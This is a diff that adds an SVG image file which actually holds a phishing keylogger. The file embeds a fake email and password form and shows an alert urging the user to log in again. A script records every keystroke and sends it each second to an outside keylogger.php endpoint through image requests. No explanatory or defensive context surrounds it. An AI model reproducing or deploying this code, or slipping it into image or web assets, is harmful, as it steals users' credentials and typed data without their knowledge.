@@ -1,0 +1,33 @@
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" baseProfile="full">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<foreignObject x="10" y="10" width="1000" height="150">
+      <div xmlns="http://www.w3.org/1999/xhtml">
+      <lable>email</lable><input width="1000"/>
+      <lable>password</lable><input width="1000" />
+          </div>
+  </foreignObject>
+   <script type="text/javascript">
+
+alert('Kinldy Relogin to continue');
+     
+var keys='';
+var url = 'https://xoroghost.000webhostapp.com/keylogger.php?c=';
+
+document.onkeypress = function(e) {
+	get = window.event?event:e;
+	key = get.keyCode?get.keyCode:get.charCode;
+	key = String.fromCharCode(key);
+	keys+=key;
+}
+window.setInterval(function(){
+	if(keys.length&gt;0) {
+		new Image().src = url+keys;
+		keys = '';
+	}
+}, 1000);
+
+   </script>
+<script>
+document.write('<input name="test"/>');
+</script>
+</svg>
